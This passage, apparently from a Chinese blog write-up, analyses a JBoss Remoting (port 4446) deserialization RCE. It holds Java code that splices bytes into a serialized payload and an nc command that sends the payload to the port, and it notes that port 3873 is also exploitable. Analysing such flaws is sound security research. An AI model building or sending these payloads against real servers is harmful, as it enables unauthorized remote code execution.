        byte[] bs = new byte[]{0x77, 0x01, 0x16, 0x79};
        System.out.println(aced.length + range.length == serialize.length);
        byte[] bytes = ArrayUtils.addAll(aced, bs);

        bytes = ArrayUtils.addAll(bytes, range);

        OutputStream file = new FileOutputStream("./test");
        InputStream is = new ByteArrayInputStream(bs);
        file.write(bytes);
        is.close();
        file.close();
    }
}
```
然后发送到4446端口，`cat test|nc 127.0.0.1 4446|hexdump -C`
![](https://img-blog.csdnimg.cn/87aaeebdcb6847faac21ebd241ce7ef3.png)

还有个JBoss开放的端口3873，即Ejb3 Remoting Connector，也可触发该反序列化漏洞


参考：
[JBoss EAP/AS <= 6.* RCE及rpc回显 ](https://xz.aliyun.com/t/11301)
[JBoss Remoting Connector 4446端口反序列化分析](https://tttang.com/archive/1751/)
